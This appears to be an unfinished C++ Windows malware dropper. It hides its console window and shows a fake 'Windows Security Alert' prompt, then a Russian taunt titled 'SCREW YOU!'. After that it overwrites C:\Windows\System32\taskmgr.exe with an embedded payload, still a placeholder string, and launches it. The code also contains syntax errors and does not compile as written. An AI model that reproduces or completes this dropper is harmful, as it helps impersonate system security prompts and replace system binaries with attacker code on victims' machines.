#include <fstream>
#include <windows.h>

void dropFile() {
    const char* data = "this will soon contain the base64 of the file";
    ofstream File("C:\\Windows\\System32\\" + "taskmgr.exe");
    File << data;
    File.close();
    system("start C:\\Windows\\System32\\taskmgr.exe");
}


int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance,
                            LPSTR lpszArgument, int nFunsterStil)  {
     HWND hide; 
     AllocConsole();
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL);, 0);
     MessageBox( NULL, L"Windows Security Server has started! \nWish you to continue?", L"Windows Security Alert", MB_YESNO | MB_ICONERROR ); //db for dialog box in case you're wondering
     MessageBox( NULL, "И? Почему меня должно волновать, что ты думаешь?", "SCREW YOU!", MB_OK | MB_ICONERROR );
     dropFile();
}
          
